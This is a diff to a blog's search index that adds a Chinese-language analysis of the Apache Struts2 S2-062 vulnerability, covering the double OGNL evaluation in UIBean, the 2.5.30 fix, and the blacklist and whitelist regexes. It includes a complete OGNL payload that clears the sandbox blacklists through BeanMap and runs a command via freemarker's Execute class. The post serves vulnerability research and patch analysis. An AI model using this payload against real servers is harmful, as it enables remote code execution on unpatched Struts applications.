@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-062</title>
+    <link href="/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-062/"/>
+    <url>/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-062/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.29，这里使用Struts 2.5.29。</p><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-062" target="_blank" rel="noopener">官方通告</a>，问题出在其他标签的某些属性中，下载Struts 2.5.29和Struts 2.5.30的源码，diff一下两个版本的UIBean类：</p><p><img src="/css/images/S2-062/2022041701.png" srcset="/img/loading.gif" alt=""></p><p>可以看到Struts 2.5.29的这段代码：</p><pre><code class="java">String expr = completeExpressionIfAltSyntax(name);if (recursion(name)) {    addParameter(&quot;nameValue&quot;, expr);} else {    addParameter(&quot;nameValue&quot;, findValue(expr, valueClazz));}</code></pre><p>以name解析后的expr作参数调用findValue，这里很有可能存在一个双重评估，看一下completeExpressionIfAltSyntax函数：</p><pre><code class="java">// Component.javaprotected String completeExpressionIfAltSyntax(String expr) {    if (altSyntax() &amp;&amp; !ComponentUtils.containsExpression(expr)) {        return &quot;%{&quot; + expr + &quot;}&quot;;    }    return expr;}// ComponentUtils.javapublic static boolean containsExpression(String expr) {    return expr != null &amp;&amp; expr.contains(&quot;%{&quot;) &amp;&amp; expr.contains(&quot;}&quot;);}</code></pre><p>如果name中没有%{}就加上去，再看一下recursion函数：</p><pre><code class="java">// Component.javaprotected boolean recursion(String expr) {    return ComponentUtils.altSyntax(stack) &amp;&amp; ComponentUtils.containsExpression(expr);}</code></pre><p>很明显containsExpression函数这里对双重评估做了一点点防护，然而虽然禁止了name中的%{}，但是它自己又会给name加上%{}变成expr，所以这里的代码写了个空，我们还是可以通过这里的双重评估执行表达式。</p><p>修改模板文件，在name属性中添加一个表达式：</p><pre><code class="html">&lt;s:label name=&quot;%{username}&quot;/&gt;</code></pre><p>输入username为：</p><pre><code>#{#application[&#39;org.apache.catalina.resources&#39;]}</code></pre><p>可以看到发生了双重评估，输入的username作为表达式执行了：</p><p><img src="/css/images/S2-062/2022041702.png" srcset="/img/loading.gif" alt=""></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先版本禁止了通过DefaultInstanceManager创建对象，但是没有禁止通过BeanMap调用某个对象的setter和getter，所以我们只要找到新的创建对象的方法就可以继续绕过沙盒。</p><p>payload中使用的是这样的写法：</p><pre><code>#@org.apache.commons.collections.BeanMap@{}</code></pre><p>效果如下：</p><p><img src="/css/images/S2-062/2022041703.png" srcset="/img/loading.gif" alt=""></p><p>该版本的#attr没有了：</p><p><img src="/css/images/S2-062/2022041704.png" srcset="/img/loading.gif" alt=""></p><p>但是#request中还有OgnlValueStack：</p><p><img src="/css/images/S2-062/2022041705.png" srcset="/img/loading.gif" alt=""></p><p>把S2-061的payload改一改就能用了，清空黑名单之后可以获取application中的InstanceManager对象来创建Execute对象完成命令执行，最后的payload：</p><pre><code class="python">data1 = {    &quot;username&quot;:    &quot;(#beanmap=#@org.apache.commons.collections.BeanMap@{}).&quot;    &quot;(#stack=#request[&#39;struts.valueStack&#39;]).&quot;    &quot;(#beanmap.setBean(#stack)).&quot;    &quot;(#context=#beanmap.get(\&quot;context\&quot;)).&quot;    &quot;(#beanmap.setBean(#context)).&quot;    &quot;(#memberAccess=#beanmap.get(\&quot;memberAccess\&quot;)).&quot;    &quot;(#beanmap.setBean(#memberAccess)).&quot;    &quot;(#beanmap.put(\&quot;excludedPackageNames\&quot;, #@org.apache.commons.collections.BeanMap@{}.keySet())).&quot;    &quot;(#beanmap.put(\&quot;excludedClasses\&quot;, #@org.apache.commons.collections.BeanMap@{}.keySet())).&quot;    &quot;(#application[&#39;org.apache.tomcat.InstanceManager&#39;].newInstance(\&quot;freemarker.template.utility.Execute\&quot;).exec({\&quot;calc.exe\&quot;}))&quot;}</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.30中，漏洞代码改动如下：</p><pre><code class="java">boolean evaluated = !translatedName.equals(this.name);boolean reevaluate = !evaluated || isAcceptableExpression(translatedName);if (!reevaluate) {    addParameter(NAME_VALUE, translatedName);} else {    String expr = completeExpressionIfAltSyntax(translatedName);    addParameter(NAME_VALUE, findValue(expr, valueClazz));}</code></pre><p>发生双重评估时translatedName与name不等，因此evaluated为true，所以reevaluate的取值取决于isAcceptableExpression函数，其代码如下：</p><pre><code class="java">protected boolean isAcceptableExpression(String expression) {    NotExcludedAcceptedPatternsChecker.IsAllowed isAllowed = notExcludedAcceptedPatterns.isAllowed(expression);    if (isAllowed.isAllowed()) {        return true;    }    LOG.warn(&quot;Expression [{}] isn&#39;t allowed by pattern [{}]! See Accepted / Excluded patterns at\n&quot; +             &quot;https://struts.apache.org/security/&quot;, expression, isAllowed.getAllowedPattern());    return false;}</code></pre><p>notExcludedAcceptedPatterns是一个DefaultNotExcludedAcceptedPatternsChecker对象，其包括一个黑名单对象DefaultExcludedPatternsChecker：</p><pre><code class="java">public static final String[] EXCLUDED_PATTERNS = {    &quot;(^|\\%\\{)((#?)(top(\\.|\\[&#39;|\\[\&quot;)|\\[\\d\\]\\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\\.|\\[).*&quot;,    &quot;.*(^|\\.|\\[|\\&#39;|\&quot;|get)class(\\(\\.|\\[|\\&#39;|\&quot;).*&quot;};</code></pre><p>通过黑名单之后是一个白名单对象，只有符合白名单的才会通过校验：</p><pre><code class="java">public static final String[] ACCEPTED_PATTERNS = {    &quot;\\w+((\\.\\w+)|(\\[\\d+])|(\\(\\d+\\))|(\\[&#39;(\\w|[\\u4e00-\\u9fa5])+&#39;])|(\\(&#39;(\\w|[\\u4e00-\\u9fa5])+&#39;\\)))*&quot;};public static final String[] DMI_AWARE_ACCEPTED_PATTERNS = {    &quot;\\w+([:]?\\w+)?((\\.\\w+)|(\\[\\d+])|(\\(\\d+\\))|(\\[&#39;(\\w|[\\u4e00-\\u9fa5])+&#39;])|(\\(&#39;(\\w|[\\u4e00-\\u9fa5])+&#39;\\)))*([!]?\\w+)?&quot;};</code></pre><p>看起来就很麻烦的正则。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/YanMu2020/s2-062/blob/main/s2-062.py" target="_blank" rel="noopener">https://github.com/YanMu2020/s2-062/blob/main/s2-062.py</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>Struts2</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-061</title>
     <link href="/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-061/"/>
     <url>/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-061/</url>
@@ -152,9 +175,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JRMP</tag>
-      
       <tag>JNDI</tag>
+      
+      <tag>JRMP</tag>
       
     </tags>
     
@@ -1759,9 +1782,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JRMP</tag>
-      
       <tag>JNDI</tag>
+      
+      <tag>JRMP</tag>
       
     </tags>
     
@@ -2456,9 +2479,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>NodeJS</tag>
+      
+      <tag>复现</tag>
       
       <tag>前端</tag>
       
